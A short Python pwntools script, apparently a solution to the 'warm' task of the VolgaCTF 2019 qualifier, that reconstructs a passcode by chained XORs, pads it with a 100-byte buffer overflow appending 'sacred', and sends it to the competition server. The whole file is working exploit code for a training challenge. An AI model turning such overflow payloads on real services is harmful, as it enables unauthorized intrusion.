#!/usr/bin/env python
from pwn import *
r = remote('warm.q.2019.volgactf.ru', 443)
passcode = []
passcode.append(chr(0x76))
passcode.append(chr(0x76 ^ 0x4e))
passcode.append(chr(ord(passcode[1]) ^ 0x1e))
passcode.append(chr(ord(passcode[2]) ^ 0x15))
passcode.append(chr(ord(passcode[3]) ^ 0x5e))
passcode.append(chr(ord(passcode[4]) ^ 0x1c))
passcode.append(chr(ord(passcode[5]) ^ 0x21))
passcode.append(chr(ord(passcode[6]) ^ 0x1))
passcode.append(chr(ord(passcode[7]) ^ 0x34))
passcode.append(chr(ord(passcode[8]) ^ 0x7))
passcode.append(chr(ord(passcode[9]) ^ 0x35))
passcode.append(chr(ord(passcode[10]) ^ 0x11))
passcode.append(chr(ord(passcode[11]) ^ 0x37))
passcode.append(chr(ord(passcode[12]) ^ 0x3c))
passcode.append(chr(ord(passcode[13]) ^ 0x72))
passcode.append(chr(ord(passcode[14]) ^ 0x47))
payload = ''
for i in range(len(passcode)):
    payload += passcode[i]
payload = payload.ljust(100, 'a') + 'sacred'
print payload
r.sendline(payload)
r.interactive()
